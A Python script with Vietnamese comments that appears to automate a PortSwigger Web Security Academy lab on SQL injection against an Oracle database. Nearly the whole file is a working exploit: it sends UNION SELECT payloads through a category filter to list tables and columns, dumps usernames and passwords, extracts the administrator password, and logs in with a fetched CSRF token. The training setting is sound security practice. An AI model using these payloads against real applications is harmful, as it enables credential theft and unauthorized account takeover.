#SQL injection attack, listing the database contents on Oracle
import requests
from bs4 import BeautifulSoup

print("Nhập URL giống như này (pls): https://(your-lab-id).web-security-academy.net/")
base_url = input("Nhập URL: ").rstrip("/")

# Tìm bảng có tên bắt đầu bằng 'USERS_'
payload1 = f"{base_url}/filter?category=x' UNION SELECT table_name, NULL FROM all_tables--"
response = requests.get(payload1)
soup = BeautifulSoup(response.text, "html.parser")

table_name = None
for row in soup.find_all("tr"):
    th = row.find("th")
    if th and th.text.strip().upper().startswith("USERS_"):
        table_name = th.text.strip()
        break

if not table_name:
    print("[-] Không tìm thấy bảng bắt đầu bằng USERS_")
    exit()

# Tìm các cột trong bảng => tìm cột có chứa từ 'USERNAME' và 'PASSWORD'
payload2 = f"{base_url}/filter?category=x' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='{table_name.upper()}'--"
response = requests.get(payload2)
soup = BeautifulSoup(response.text, "html.parser")

username_col = None
password_col = None
for row in soup.find_all("tr"):
    th = row.find("th")
    if th:
        col = th.text.strip()
        col_upper = col.upper()
        if "USERNAME" in col_upper:
            username_col = col
        elif "PASSWORD" in col_upper:
            password_col = col
    if username_col and password_col:
        break

if not username_col or not password_col:
    print("[-] Không tìm thấy cột username/password")
    exit()

# Lấy mật khẩu administrator
payload3 = f"{base_url}/filter?category=x' UNION SELECT {username_col} || ':' || {password_col}, NULL FROM {table_name}--"
response = requests.get(payload3)
soup = BeautifulSoup(response.text, "html.parser")

admin_password = None
for row in soup.find_all("tr"):
    th = row.find("th")
    if th and "administrator:" in th.text:
        admin_password = th.text.split(":", 1)[1].strip()
        break

if not admin_password:
    print("[-] Không tìm thấy mật khẩu administrator")
    exit()

print(f"[+] Ngon, mật khẩu administrator là: {admin_password}")
print(f"[!] Bắt đầu đăng nhập...")

# Đăng nhập
login_url = f"{base_url}/login"
session = requests.Session()
response = session.get(login_url)
soup = BeautifulSoup(response.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

login_data = {
    "csrf": csrf,
    "username": "administrator",
    "password": admin_password
}
response = session.post(login_url, data=login_data)

if (response.status_code == 200):
    print("[+] Ngon, đăng nhập vào được rồi.")
else:
    print("[-] Thua, ca này khó vl bố chịu.")
